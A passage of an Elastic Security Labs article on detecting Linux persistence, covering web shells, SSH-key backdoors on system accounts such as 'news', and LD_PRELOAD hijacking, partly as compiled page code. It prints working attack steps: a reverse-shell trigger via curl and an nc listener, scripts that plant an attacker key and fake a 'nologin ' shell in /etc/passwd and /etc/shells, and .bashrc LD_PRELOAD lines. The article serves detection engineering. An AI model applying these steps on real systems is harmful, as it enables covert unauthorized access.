the background at port 8080.\n[!] In case you cannot connect, ensure your firewall settings are allowing inbound traffic on port 8080.\n\nRun the following commands in case of issues on RHEL/CentOS systems:\n\nsudo firewall-cmd --add-port=8080/tcp --permanent\nsudo firewall-cmd --reload\n```\n\nAfter which, we can communicate with the reverse shell from the attacker machine through the following commands:\n\n```bash\n// Terminal 1\n\u003e curl http://192.168.1.100:8080/cgi-bin/reverse.py\n\n// Terminal 2\n\u003e nc -nvlp 2018\nlistening on [any] 2018 ...\nconnect to [192.168.211.131] from (UNKNOWN) [192.168.211.151] 47250\n\u003e whoami\nruben\n```\n\nThis module generates the following documents:\n\n\n![PANIX web-shell module execution visualized in Kibana (reverse shell payload)]( /assets/images/continuation-on-persistence-mechanisms/image4.png \"PANIX web-shell module execution visualized in Kibana (reverse shell payload)\")\n\nAfter PANIX executes, we can see `/home/ruben/panix/cgi-bin/reverse.py` being created and execution permissions being granted. A `python3` web server with CGI support is spawned. After executing the `curl` command from the attacker machine, we can see an incoming connection through the `connection_accepted` event, followed by the execution of the reverse shell command, leading to the call back to the attacker machine through the `connection_attempted` event. A fully interactive shell is obtained once the attacker catches the reverse connection.\n\nYou can revert the changes made by PANIX by running the following revert command:\n\n```bash\n\u003e ./panix.sh --revert web-shell\n\n###### [+] Reverting web-shell module... #####\n\n[+] Running as non-root. Reverting web shell for user 'ruben'.\n[+] Reverting web shell for user 'ruben' at: /home/ruben/panix/\n[+] Identifying web server processes serving /home/ruben/panix/...\n[+] Killed process 11592 serving /home/ruben/panix/.\n[+] Removed web server directory: /home/ruben/panix/\n```\n\nAfter which, all artifacts should be cleaned.\n\nLet’s take a look at the coverage:\n\n| Category | Coverage                                               |\n|----------|--------------------------------------------------------|\n| File     | [Suspicious File Creation via Web Server](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_suspicious_file_creation_via_web_server.toml)                |\n| Process  | [File Downloaded from Suspicious Source by Web Server](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_file_downloaded_from_suspicious_source_by_web_server.toml)   |\n|          | [File Downloaded and Piped to Interpreter by Web Server](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_file_downloaded_and_piped_to_interpreter_by_web_server.toml) |\n|          | [Suspicious Download and Redirect by Web Server](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_suspicious_download_and_redirect_by_web_server.toml)         |\n|          | [Web Server Spawned via Python](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_python_webserver_spawned.toml)                          |\n|          | [Simple HTTP Web Server Creation](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_simple_web_server_creation.toml)                        |\n|          | [Potential Remote Code Execution via Web Server](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_linux_shell_activity_via_web_server.toml)         |\n|          | [File Downloaded to Suspicious Location by Web Server](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_file_downloaded_to_suspicious_location_by_web_server.toml)   |\n|          | [Decode Activity via Web Server](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_decode_activity_via_web_server.toml)                         |\n|          | [Unusual Command Executed by Web Server](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/persistence_unusual_command_executed_by_web_server.toml)                 |\n| Network  | [Reverse Shell Executed via Web Server](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_reverse_shell_executed_via_web_server.toml)                  |\n|          | [Simple HTTP Web Server Connection](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_simple_web_server_connection_accepted.toml) |\n*Detection and endpoint rules that cover web shell persistence*\n\n#### Hunting for T1505.003 - Web Shell\n\nWe can hunt for this technique using ES|QL and OSQuery by focusing on suspicious file creation events and anomalous network activity commonly associated with web shells. The approach includes monitoring for the following:\n\n* **Creation or renaming of web shell files:** Tracks files with extensions such as `.php`, `.py`, `.pl`, `.rb`, `.lua`, and `.jsp` in unexpected or uncommon locations, which may indicate the deployment of a web shell.\n* **Anomalous network activity by scripting engines:** Observes disconnect events and unusual connections initiated by processes like `python`, `php`, or `perl`, particularly connections to external IP addresses.\n* **Low-frequency external connections:** Detects rare or low-volume network connections from processes, especially those initiated by root or unique agents, which can indicate malicious web shell activity.\n\nBy combining the [Persistence via Web Shell](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_web_shell.md), [Persistence Through Reverse/Bind Shells](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_reverse_bind_shells.md), and [Low Volume External Network Connections from Process by Unique Agent](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/low_volume_external_network_connections_from_process.md) hunting rules with the tailored detection queries listed above, analysts can effectively detect and respond to [T1505.003](https://attack.mitre.org/techniques/T1505/003/).\n\n## T1098.004 - Account Manipulation: SSH Authorized Keys\n\nSSH's `authorized_keys` feature is a common target for attackers aiming to establish persistent access to compromised Linux systems. By placing their public keys in the `authorized_keys` file, attackers can gain access without requiring further authentication if the private key is in their possession. This mechanism is controlled by files like `.ssh/authorized_keys` or `.ssh/authorized_keys2`, typically in the user’s home directory. While this persistence method is well-documented, we explored its nuances in detail in [a previous article](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms#t1098004---account-manipulation-ssh).\n\nIn this section, we will focus on a less conventional but intriguing variation of this technique: abusing system accounts that by default are rarely used and have default configurations. This approach leverages the default home directories of these users to create `.ssh` directories and insert `authorized_keys` files, enabling SSH-based persistence under these accounts. [Exatrack’s research](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/) on a new variant of the `perfctl` malware recently explored this technique. Although this specific variation of the authorized keys persistence technique is not tracked by MITRE, the overall persistence technique is tracked under [T1098.004](https://attack.mitre.org/techniques/T1098/004/).\n\n### T1098.004 - SSH Authorized Keys: System User Backdoors\n\nSystem accounts like `news` or `nobody` often exist on default Linux installations with non-interactive shells (e.g., `/usr/sbin/nologin`) and predefined home directories. These accounts, typically overlooked and not intended for direct login, can become attractive targets for attackers. We can observe their configurations in the `/etc/passwd` file:\n\n```bash\n\u003e cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n```\n\nAs we can see, the root user's home directory is `/root/`, while system users like `news`, `backup`, and `nobody` also have default home directories, such as `/var/spool/news/` and `/nonexistent/`. The default shell for root is `/bin/bash`, whereas system users are restricted by `/usr/sbin/nologin`.\n\nAlthough system users are intended to be non-interactive, attackers can exploit their configurations by creating `.ssh` directories in their home directories and adding `authorized_keys` files for SSH-based authentication. By manipulating the `/etc/passwd` file and shell configuration, attackers can bypass restrictions imposed by `/usr/sbin/nologin` and gain access. The next section will explore this technique in detail, including the steps attackers use to execute it.\n\n#### Persistence through T1098.004 -  SSH Authorized Keys: Backdoored System Users\n\nLet’s examine how the PANIX [setup_backdoor_system_user.sh](https://github.com/Aegrah/PANIX/blob/7d5bb3892a79fd23d485c3ed82b8fefc81f178e0/modules/setup_backdoor_system_user.sh) module abuses this trick to leverage non-interactive system accounts to gain SSH access onto a target without creating a new user. Refer to the module to inspect the full payloads.\n\nThe first step is to identify a system user as the target for the attack. For example, as we know:\n\n* The `news` user has `/var/spool/news/` as its home directory.\n* The `nobody` user has `/nonexistent/` by default (which can be created).\n\nThe next step is to create the `.ssh` directory within the home directory and writes the attacker’s public key to the `authorized_keys` file, and ensure the correct file permissions:\n\n```bash\n# Create the .ssh directory\nmkdir -p \"$home_dir/.ssh\"\nchmod 755 \"$home_dir/.ssh\"  # Set directory permissions to be accessible by others\n\n# Write the public key to authorized_keys\necho \"$key\" \u003e \"$home_dir/.ssh/authorized_keys\"\nchmod 644 \"$home_dir/.ssh/authorized_keys\"  # Set file permissions to be readable by others\n```\n\nThis step ensures that the attacker can authenticate via SSH using their private key. The next step is to modify the shell. By default, system users like `news` and `nobody` are configured with `/usr/sbin/nologin` as their shell, which prevents interactive login sessions. We need to circumvent this restriction by:\n\n1. Copying (for example) `/bin/dash` to `/usr/sbin/nologin` (with a trailing space).\n2. Updating `/etc/passwd` to include the modified shell path.\n\n```bash\n# Copy /bin/dash to '/usr/sbin/nologin '\ncp /bin/dash \"/usr/sbin/nologin \"\n\n# Modify /etc/passwd to include the trailing space in the shell path\nlocal username=$(echo \"$user_entry\" | cut -d: -f1)\nsed -i \"/^$username:/s|:/usr/sbin/nologin$|:/usr/sbin/nologin |\" /etc/passwd \n```\n\nWhere the local username variable can be set to any system user. This subtle manipulation tricks the system into treating `/usr/sbin/nologin `(with a trailing space) as a valid shell.\n\nFinally, to ensure SSH accepts the modified shell as valid, we need to add `nologin `(with a trailing space) to `/etc/shells`:\n\n```bash\n# Check and add \"nologin \" to /etc/shells if not already present\nif ! grep -q \"nologin \" /etc/shells; then\n    echo \"nologin \" \u003e\u003e /etc/shells\n    echo \"[+] Added 'nologin ' to /etc/shells\"\nelse\n    echo \"[+] 'nologin ' already exists in /etc/shells. Skipping.\"\nfi\n```\n\nThis step ensures SSH does not reject login attempts due to the manipulated shell. Now that we understand the flow, let’s run the module. \n\n```bash\n\u003e sudo ./panix.sh --backdoor-system-user --default --key \u003cssh-rsa public key\u003e\n\n[+] Added 'nologin ' to /etc/shells\n[+] Copied /bin/dash to '/usr/sbin/nologin '\n[+] Modified /etc/passwd to update shell path for user: news\n[+] System user backdoor persistence established for user: news\n```\n\nAfter which we can log in to the system via SSH with the `news` user:\n\n```bash\n\u003e ssh news@192.168.31.129\nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-130-generic x86_64)\n```\n\nAnd analyze this technique’s traces in Discover:\n\n![PANIX backdoor-system-user module execution visualized in Kibana]( /assets/images/continuation-on-persistence-mechanisms/image1.png \"PANIX backdoor-system-user module execution visualized in Kibana\")\n\nUpon PANIX execution, the `/var/spool/news/.ssh/` directory and `authorized_keys` files are created and granted the correct permissions (`755` and `644` respectively). Next, the `/usr/sbin/nologin`  (with trailing space) file is created, and the `/etc/passwd` and `/etc/shells` files are modified. Upon completion, the `news` user is able to authenticate via SSH, with an interactive shell.\n\nYou can revert the changes made by PANIX by running the following revert command:\n\n```bash\n\u003e sudo ./panix.sh --revert backdoor-system-user\n\n###### [+] Reverting backdoor-system-user module... #####\n\n[+] Removing .ssh directory for user: news\n[+] Successfully removed .ssh directory for news.\n[+] Reverting /etc/passwd entry for user: news\n[+] Successfully reverted /etc/passwd entry for news.\n\n[+] Removing '/usr/sbin/nologin '\n[+] Successfully removed '/usr/sbin/nologin '.\n[+] Reverting /etc/shells to remove 'nologin ' entry.\n[+] Successfully removed 'nologin ' from /etc/shells.\n```\n\nAfter which all artifacts should be cleaned.\n\nThere are several detection- and endpoint rules set up to detect different parts of this technique:\n\n| Category | Coverage                                            |\n|----------|-----------------------------------------------------|\n| IAM      | [Login via Unusual System User](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_ssh_via_backdoored_system_user.toml)                       |\n| Process  | [Unusual Interactive Shell Launched from System User](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/defense_evasion_interactive_shell_from_system_user.toml) |\n|          | [Potential Nologin SSH Backdoor](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/defense_evasion_potential_nologin_ssh_backdoor.toml)                      |\n|          | [Masquerading Space After Filename](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/cross-platform/defense_evasion_masquerading_space_after_filename.toml)                   |\n*Detection and endpoint rules that cover backdoored system user persistence*\n\n#### Hunting for T1098.004 -  SSH Authorized Keys: Backdoored System Users\n\nWe can hunt for this technique using ES|QL and OSQuery by focusing on identifying unauthorized SSH key additions, tampered system files, and unusual activity involving system users such as `news` or `nobody`. The following key areas are effective for detection:\n\n* **Suspicious SSH Key Modifications**: Monitors for changes to `.ssh` directories and `authorized_keys` files in unexpected locations, such as `/var/spool/news/.ssh/` or `/nonexistent/.ssh/`.\n* **Unusual File Changes**: Identifies modifications to SSH-related files and directories, tracking ownership and access patterns.\n* **Interactive Process Activity**: Detects rare interactive sessions initiated by system accounts that typically lack login access.\n* **System File Tampering**: Flags modifications to `/etc/passwd` and `/etc/shells`, including unusual shell paths or additions of invalid entries like `nologin `.\n\nBy leveraging the [Persistence via SSH Configurations and/or Keys](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_ssh_configurations_and_keys.md) hunt, analysts can uncover unauthorized persistence mechanisms, investigate potential abuse of system accounts, and respond effectively to these threats.\n\n## Conclusion\n\nIn this third chapter of the \"Linux Detection Engineering\" series, we explored various persistence techniques adversaries might leverage on Linux systems. Starting with dynamic linker hijacking, we demonstrated how manipulation of the dynamic linker through `LD_PRELOAD` can be abused for persistence. We then looked into loadable kernel modules (LKMs), a powerful feature that allows attackers to embed malicious code directly into the kernel, offering deep system control and persistence. We then explored the threat web shells pose, which enable scripting-based persistence and remote access, making them a significant risk in web-exposed environments. Finally, we analyzed the exploitation of default system users with non-interactive shells, revealing how attackers can leverage these often-overlooked accounts to establish persistence without creating new user entries.\n\nThese techniques underscore the ingenuity and variety of methods adversaries can employ to persist on Linux systems. You can build robust defenses and fine-tune your detection strategies by leveraging [PANIX](https://github.com/Aegrah/PANIX) to simulate these attacks and using the tailored ES|QL and OSQuery detection queries provided.\n","code":"var Component=(()=\u003e{var h=Object.create;var o=Object.defineProperty;var u=Object.getOwnPropertyDescriptor;var m=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,b=Object.prototype.hasOwnProperty;var f=(i,e)=\u003e()=\u003e(e||i((e={exports:{}}).exports,e),e.exports),g=(i,e)=\u003e{for(var t in e)o(i,t,{get:e[t],enumerable:!0})},c=(i,e,t,l)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of m(e))!b.call(i,r)\u0026\u0026r!==t\u0026\u0026o(i,r,{get:()=\u003ee[r],enumerable:!(l=u(e,r))||l.enumerable});return i};var y=(i,e,t)=\u003e(t=i!=null?h(p(i)):{},c(e||!i||!i.__esModule?o(t,\"default\",{value:i,enumerable:!0}):t,i)),w=i=\u003ec(o({},\"__esModule\",{value:!0}),i);var d=f((T,s)=\u003e{s.exports=_jsx_runtime});var x={};g(x,{default:()=\u003e_,frontmatter:()=\u003ev});var n=y(d()),v={title:\"Linux Detection Engineering - A Continuation on Persistence Mechanisms\",slug:\"continuation-on-persistence-mechanisms\",date:\"2025-01-27\",subtitle:\"Enhancing Linux detection engineering with lessons learned and refined practices for persistence monitoring.\",description:\"This document continues the exploration of Linux detection engineering, emphasizing advancements in monitoring persistence mechanisms. By building on past practices and insights, it provides a roadmap for improving detection strategies in complex environments.\",author:[{slug:\"ruben-groenewoud\"}],image:\"continuation-on-persistence-mechanisms.jpg\",category:[{slug:\"detection-science\"}],tags:[\"linux\",\"persistence\"]};function a(i){let e=Object.assign({h2:\"h2\",p:\"p\",ul:\"ul\",li:\"li\",a:\"a\",code:\"code\",pre:\"pre\",ol:\"ol\",h3:\"h3\",h4:\"h4\",img:\"img\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\",em:\"em\",strong:\"strong\",br:\"br\"},i.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(e.h2,{id:\"introduction\",children:\"Introduction\"}),`\n`,(0,n.jsx)(e.p,{children:\"Welcome to part three of the Linux Persistence Detection Engineering series! In this article, we continue to dig deep into the world of Linux persistence. Building on foundational concepts and techniques explored in the previous publications, this post discusses some additional, creative and/or complex persistence mechanisms.\"}),`\n`,(0,n.jsx)(e.p,{children:\"If you missed the earlier articles, they lay the groundwork by exploring key persistence concepts. You can catch up on them here:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"Linux Detection Engineering - A Primer on Persistence Mechanisms\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms\",rel:\"nofollow\",children:\"Linux Detection Engineering - A Sequel on Persistence Mechanisms\"})}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"In this publication, we\\u2019ll provide insights into:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"How each works (theory)\"}),`\n`,(0,n.jsx)(e.li,{children:\"How to set each up (practice)\"}),`\n`,(0,n.jsx)(e.li,{children:\"How to detect them (SIEM and Endpoint rules)\"}),`\n`,(0,n.jsx)(e.li,{children:\"How to hunt for them (ES|QL and OSQuery reference hunts)\"}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"To make the process even more engaging, we will be leveraging \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\", a custom-built Linux persistence tool designed by Ruben Groenewoud of Elastic Security. PANIX allows you to streamline and experiment with Linux persistence setups, making it easy to identify and test detection opportunities.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"By the end of this series, you'll have a robust knowledge of common and rare Linux persistence techniques; and you'll understand how to effectively engineer detections for common and advanced adversary capabilities. Are you ready to continue the journey on Linux persistence mechanisms? Let\\u2019s dive in!\"}),`\n`,(0,n.jsx)(e.h2,{id:\"setup-note\",children:\"Setup note\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"To ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules\",rel:\"nofollow\",children:\"enable and update our pre-built detection rules\"}),\". If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill any gaps. Now, we are ready to get started.\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"t1574006---hijack-execution-flow-dynamic-linker-hijacking\",children:\"T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man8/ld.so.8.html\",rel:\"nofollow\",children:\"dynamic linker\"}),\" is a critical component of the Linux operating system responsible for loading and linking shared libraries required by dynamically linked executables. When a program is executed, the dynamic linker resolves references to shared libraries, loading them into memory and linking them to the application at runtime. This allows programs to use external libraries, such as the GNU C Library (\",(0,n.jsx)(e.code,{children:\"glibc\"}),\"), without including the library code within the program itself, which saves memory and simplifies updates.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Several key files and paths that play a crucial role in dynamic linking libraries are the following:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"Dynamic linker binaries (e.g. \",(0,n.jsx)(e.code,{children:\"ld-linux-x86-64.so.2\"}),\"):\",`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"Typically located in \",(0,n.jsx)(e.code,{children:\"/lib/\"}),\"  or \",(0,n.jsx)(e.code,{children:\"/usr/lib/\"}),\" for 32-bit systems.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Found in \",(0,n.jsx)(e.code,{children:\"/lib64/\"}),\" or \",(0,n.jsx)(e.code,{children:\"/usr/lib64/\"}),\" on 64-bit systems.\"]}),`\n`]}),`\n`]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Symbolic links to dynamic linker binaries:\",`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"Typically found in \",(0,n.jsx)(e.code,{children:\"/lib/x86_64-linux-gnu/\"}),\" or \",(0,n.jsx)(e.code,{children:\"/usr/lib/x86_64-linux-gnu/\"}),\" for 64-bit systems.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Typically found in \",(0,n.jsx)(e.code,{children:\"/lib/i386-linux-gnu/\"}),\" and \",(0,n.jsx)(e.code,{children:\"/usr/lib/i386-linux-gnu/\"}),\" on 32-bit systems.\"]}),`\n`]}),`\n`]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Configuration files:\",`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"/etc/ld.so.conf\"}),\": Specifies additional library paths for the dynamic linker.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"/etc/ld.so.cache\"}),\": A precompiled cache of library locations generated by \",(0,n.jsx)(e.code,{children:\"ldconfig\"}),\" for efficient resolution.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"/etc/ld.so.preload\"}),\": Specifies libraries to load before any other libraries.\"]}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"You can observe the dynamic linker in action using the \",(0,n.jsx)(e.code,{children:\"ldd\"}),\" command, which lists the shared libraries required by an executable and their resolved paths. For example:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-python\",children:`\u003e ldd /bin/ls\n\nlinux-vdso.so.1 (0x00007fff87480000)\nlibc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f235ff29000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f236034a000)\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This output shows the libraries needed by the \",(0,n.jsx)(e.code,{children:\"ls\"}),\" command, along with their locations and the dynamic linker binary responsible for loading them. The dynamic linker itself appears as \",(0,n.jsx)(e.code,{children:\"/lib64/ld-linux-x86-64.so.2\"}),\" in this case.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"When a dynamically linked program is executed, the process follows these steps:\"}),`\n`,(0,n.jsxs)(e.ol,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"The dynamic linker loads the binary's \",(0,n.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man5/elf.5.html\",rel:\"nofollow\",children:\"ELF\"}),\" (Executable and Linkable Format) header to determine the required libraries.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"It searches for the specified libraries in paths defined by:\",`\n`,(0,n.jsxs)(e.ol,{children:[`\n`,(0,n.jsx)(e.li,{children:\"Default system library paths.\"}),`\n`,(0,n.jsxs)(e.li,{children:[\"Custom paths specified in \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.conf\"}),\" or environment variables like \",(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\" and \",(0,n.jsx)(e.code,{children:\"LD_LIBRARY_PATH\"}),\".\"]}),`\n`]}),`\n`]}),`\n`,(0,n.jsx)(e.li,{children:\"It maps the libraries into the program\\u2019s memory space and resolves symbols (e.g., function or variable references) required by the program.\"}),`\n`,(0,n.jsx)(e.li,{children:\"Execution is handed over to the program once all dependencies are resolved.\"}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Dynamic Linker Hijacking occurs when an attacker manipulates the linking process to redirect execution flow. This can involve altering the library search order through \",(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\", modifying configuration files like \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.conf\"}),\", or tampering with cached library mappings in \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.cache\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Malware such as \",(0,n.jsx)(e.a,{href:\"https://sandflysecurity.com/blog/detecting-and-de-cloaking-hiddenwasp-linux-stealth-malware/\",rel:\"nofollow\",children:\"HiddenWasp\"}),\", \",(0,n.jsx)(e.a,{href:\"https://intezer.com/blog/research/new-linux-threat-symbiote/\",rel:\"nofollow\",children:\"Symbiote\"}),\", and open-source rootkits such as \",(0,n.jsx)(e.a,{href:\"https://github.com/ldpreload/Medusa\",rel:\"nofollow\",children:\"Medusa\"}),\" and \",(0,n.jsx)(e.a,{href:\"https://github.com/chokepoint/azazel\",rel:\"nofollow\",children:\"Azazel\"}),\" leverage this technique to establish persistence. MITRE ATT\u0026CK tracks this technique under the identifier \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1574/006/\",rel:\"nofollow\",children:\"T1574.006\"}),\".\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"t1574006---dynamic-linker-hijacking-ld_preload\",children:\"T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\" and \",(0,n.jsx)(e.code,{children:\"LD_LIBRARY_PATH\"}),\" environment variables control how shared libraries are loaded by dynamically linked executables. Both are legitimate tools for debugging, profiling, and customizing application behavior, but they are also susceptible to abuse by attackers seeking to hijack the execution flow.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\" variable allows users to specify shared libraries that the dynamic linker should load before any others. This preloading ensures that functions or symbols in the specified libraries override those in standard or program-specified libraries. For instance, \",(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\" is often used to test new implementations of library functions without modifying the application itself. For example:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`LD_PRELOAD=/tmp/custom_library.so /bin/ls\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"In this case, the dynamic linker will load \",(0,n.jsx)(e.code,{children:\"custom_library.so\"}),\" before loading any other libraries required by \",(0,n.jsx)(e.code,{children:\"/bin/ls\"}),\", effectively replacing or augmenting its behavior. Running \",(0,n.jsx)(e.code,{children:\"ldd\"}),\" this time shows a different output:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-python\",children:`\u003e ldd /bin/ls\n\nlinux-vdso.so.1 (0x00007fff87480000)\nlibc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f235ff29000)\nlibcustom.so =\u003e /tmp/custom_library.so (0x00007f23ac7e5000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f236034a000)\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Indicating that the potentially malicious \",(0,n.jsx)(e.code,{children:\"custom_library.so\"}),\" will be loaded prior to all others.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.code,{children:\"LD_LIBRARY_PATH\"}),\" variable specifies directories for the dynamic linker to search when resolving shared libraries. This variable takes precedence over default library paths like \",(0,n.jsx)(e.code,{children:\"/lib/\"}),\" and \",(0,n.jsx)(e.code,{children:\"/usr/lib/\"}),\", allowing users to override system libraries with custom versions located in alternate directories:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`LD_LIBRARY_PATH=/tmp/custom_libs /bin/ls\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Here, the dynamic linker will first search \",(0,n.jsx)(e.code,{children:\"/tmp/custom_libs\"}),\" for the libraries required by \",(0,n.jsx)(e.code,{children:\"/bin/ls\"}),\". If a library is found there, it will be loaded instead of the default version.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"While both \",(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\" and \",(0,n.jsx)(e.code,{children:\"LD_LIBRARY_PATH\"}),\" can hijack the execution flow, they operate differently:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\" directly specifies libraries to be loaded first, providing precise control over which functions are overridden.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"LD_LIBRARY_PATH\"}),\" alters the library search path, potentially affecting multiple libraries and their dependencies.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Environment variables can be set by regular users without requiring administrative access, making them a useful tool to hijack the execution flow without requiring root privileges. Setting environment variables is not persistent. To make the changes persistent across sessions, attackers can append these variables to the shell initialization files such as \",(0,n.jsx)(e.code,{children:\"~/.bashrc\"}),\" or \",(0,n.jsx)(e.code,{children:\"~/.zshrc\"}),\". For example:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-python\",children:`\u003e echo 'export LD_PRELOAD=/tmp/malicious_library.so' \u003e\u003e ~/.bashrc\n\u003e echo 'export LD_LIBRARY_PATH=/tmp/custom_libs' \u003e\u003e ~/.bashrc\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"On the next successful login, these variables will automatically be set, ensuring that the specified libraries are loaded whenever a dynamically linked 